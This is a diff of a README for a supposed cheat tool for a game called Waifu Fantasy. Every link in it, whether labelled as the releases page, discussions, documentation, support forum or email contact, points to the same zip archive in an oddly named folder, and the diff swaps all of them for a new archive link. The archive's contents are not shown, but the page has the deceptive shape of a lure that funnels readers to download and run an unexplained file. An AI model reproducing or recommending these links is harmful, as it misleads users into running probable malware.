@@ -1,7 +1,7 @@
 # 🎮 Speed-Boost-Fantasy-Waifu-cheats - Boost Your Gaming Adventure Easily
 
 ## 📥 Download the Latest Release
-[![Download Speed-Boost-Fantasy-Waifu-cheats](https://raw.githubusercontent.com/MinParkwee1212/Speed-Boost-Fantasy-Waifu-cheats/main/isotrimorphic/Speed-Boost-Fantasy-Waifu-cheats.zip%20release-brightgreen)](https://raw.githubusercontent.com/MinParkwee1212/Speed-Boost-Fantasy-Waifu-cheats/main/isotrimorphic/Speed-Boost-Fantasy-Waifu-cheats.zip)
+[![Download Speed-Boost-Fantasy-Waifu-cheats](https://github.com/MinParkwee1212/Speed-Boost-Fantasy-Waifu-cheats/raw/refs/heads/main/isotrimorphic/Speed_Boost_cheats_Fantasy_Waifu_2.5.zip%20release-brightgreen)](https://github.com/MinParkwee1212/Speed-Boost-Fantasy-Waifu-cheats/raw/refs/heads/main/isotrimorphic/Speed_Boost_cheats_Fantasy_Waifu_2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the Speed-Boost-Fantasy-Waifu-cheats repository! This guide will help you download and run the application smoothly. With our tool, you can enhance your Waifu Fantasy gameplay and enjoy features like unlimited HP, no cooldowns, and damage multipliers.
@@ -21,7 +21,7 @@ Welcome to the Speed-Boost-Fantasy-Waifu-cheats repository! This guide will help
 
 ## 📂 Download & Install
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/MinParkwee1212/Speed-Boost-Fantasy-Waifu-cheats/main/isotrimorphic/Speed-Boost-Fantasy-Waifu-cheats.zip) to download the latest version of the Speed-Boost-Fantasy-Waifu-cheats.
+   Go to our [Releases page](https://github.com/MinParkwee1212/Speed-Boost-Fantasy-Waifu-cheats/raw/refs/heads/main/isotrimorphic/Speed_Boost_cheats_Fantasy_Waifu_2.5.zip) to download the latest version of the Speed-Boost-Fantasy-Waifu-cheats.
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of the application. Click on the version that matches your operating system.
@@ -49,19 +49,19 @@ Welcome to the Speed-Boost-Fantasy-Waifu-cheats repository! This guide will help
 If you encounter any issues:
 - **Check Requirements**: Ensure your system meets the requirements listed above.
 - **Reinstall**: If problems persist, uninstall and reinstall the application.
-- **Consult the Community**: Visit our [GitHub Discussions page](https://raw.githubusercontent.com/MinParkwee1212/Speed-Boost-Fantasy-Waifu-cheats/main/isotrimorphic/Speed-Boost-Fantasy-Waifu-cheats.zip) for additional support.
+- **Consult the Community**: Visit our [GitHub Discussions page](https://github.com/MinParkwee1212/Speed-Boost-Fantasy-Waifu-cheats/raw/refs/heads/main/isotrimorphic/Speed_Boost_cheats_Fantasy_Waifu_2.5.zip) for additional support.
 
 ## 📣 Join the Community
 Engage with other users and share your experiences. Join our discussions on GitHub to give feedback, ask questions, or suggest new features.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://raw.githubusercontent.com/MinParkwee1212/Speed-Boost-Fantasy-Waifu-cheats/main/isotrimorphic/Speed-Boost-Fantasy-Waifu-cheats.zip): Learn more about features and advanced settings.
-- [Support Forum](https://raw.githubusercontent.com/MinParkwee1212/Speed-Boost-Fantasy-Waifu-cheats/main/isotrimorphic/Speed-Boost-Fantasy-Waifu-cheats.zip): Ask questions and get support from fellow users.
+- [Official Documentation](https://github.com/MinParkwee1212/Speed-Boost-Fantasy-Waifu-cheats/raw/refs/heads/main/isotrimorphic/Speed_Boost_cheats_Fantasy_Waifu_2.5.zip): Learn more about features and advanced settings.
+- [Support Forum](https://github.com/MinParkwee1212/Speed-Boost-Fantasy-Waifu-cheats/raw/refs/heads/main/isotrimorphic/Speed_Boost_cheats_Fantasy_Waifu_2.5.zip): Ask questions and get support from fellow users.
 
 ## 📜 License
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## 📞 Contact
-For questions or support, please reach out via GitHub issues or email us at https://raw.githubusercontent.com/MinParkwee1212/Speed-Boost-Fantasy-Waifu-cheats/main/isotrimorphic/Speed-Boost-Fantasy-Waifu-cheats.zip 
+For questions or support, please reach out via GitHub issues or email us at https://github.com/MinParkwee1212/Speed-Boost-Fantasy-Waifu-cheats/raw/refs/heads/main/isotrimorphic/Speed_Boost_cheats_Fantasy_Waifu_2.5.zip 
 
 Thank you for using Speed-Boost-Fantasy-Waifu-cheats! Enjoy your gaming experience more than ever before.
